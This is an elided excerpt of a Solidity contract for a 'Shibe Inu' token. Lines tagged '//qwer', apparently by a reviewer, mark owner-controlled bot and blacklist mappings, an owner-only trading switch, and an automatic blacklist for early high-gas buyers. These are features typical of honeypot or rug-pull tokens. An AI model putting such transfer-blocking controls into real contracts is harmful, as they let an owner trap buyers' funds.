...
/**
tG: https://t.me/ShibeInu
website: http://shibeinu.finance/
*/
...
contract ShibeInu is IERC20, Ownable {
    ...
    string _name = "Shibe Inu";
    string _symbol = "Shibe";
    ...
    mapping(address => bool) public isBot;//qwer
    uint256 public _totalProportion = _totalSupply;

    mapping (address => mapping (address => uint256)) _allowances;
    mapping (address => bool) public isBlacklisted;//qwer
    mapping (address => bool) isFeeExempt;
    mapping (address => bool) isTxLimitExempt;
    uint256 gweiLimitBlocksAffected = 100;//qwer
    uint256 gweiLimit = 3 * (10 ** 9);//qwer
    ...
    uint256 AB1 = 12 * 1 gwei; // qwer
    address autoLiquidityReceiver;
    address marketingFeeReceiver;
    uint256 public launchedAt; // qwer
    uint256 targetLiquidity = 200;
    uint256 targetLiquidityDenominator = 100;
    bool public tradingOpen = false; // qwer
    ...
    constructor () {
        ...
        address marketingreceiver = 0x3fc71B9FE5b9CdEdfE61799859487fBb9ed46f0c;
    ...
    function UpdateAB1 (uint256 _AB1) public onlyOwner {
        ...
        // Set the launchedAt to token launch // qwer
    function launch() internal {
        launchedAt = block.number;
    }
    // Blacklist/unblacklist an address // qwer
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        require(tradingOpen,"Trading not enabled yet");//qwer
        require(!isBot[sender] && !isBot[recipient],"You can't transfer tokens");//qwer
        require(!isBlacklisted[recipient] && !isBlacklisted[sender], 'Address is blacklisted');//qwer
        ...
        if(sender == pair && launchedAt + gweiLimitBlocksAffected >= block.number && tx.gasprice >= gweiLimit){isBlacklisted[recipient] = true;}//qwer
